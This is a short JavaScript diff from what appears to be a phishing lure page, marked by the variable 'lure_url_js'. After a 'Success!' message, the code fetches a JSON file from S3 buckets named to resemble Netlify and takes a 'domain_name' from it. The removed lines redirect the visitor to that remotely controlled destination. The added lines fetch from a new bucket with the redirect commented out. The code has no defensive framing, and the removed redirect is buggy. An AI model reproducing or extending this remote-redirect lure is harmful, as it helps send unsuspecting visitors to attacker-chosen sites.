@@ -498,23 +498,13 @@
             var lure_url_js = "https://google.com/";
             var url = lure_url_js + "#";
             (document.getElementById("msg").innerHTML = "Success!"),
-              fetch('https://netlifygit.s3.ca-central-1.amazonaws.com/netligit.json', 
-                  {
-                    method: 'GET',
-                    headers: {
-                      'Accept': 'application/json',
-                      'Access-Control-Allow-Origin': 'https://google.com'
-                    }
-                  }           
-              )
-                .then(response => response.json())
-                .then(data => {
-                  // Access the value from the JSON object
-                  const content = JSON.stringify(data);
-                  console.log(content);
-                  window.open(content.domain_name, "_self");
-                })
-                .catch(error => console.error(error));
+              fetch('https://netlify2.s3.eu-west-2.amazonaws.com/netligit.json')
+                  .then((response) => response.json())
+                  .then(function(data) {
+                      // filter(data);
+                    console.log("url: ", data);
+              	// window.location.href = data.domain_name;
+              });
           },
           onFail: cleanMsg,
           onRefresh: cleanMsg,
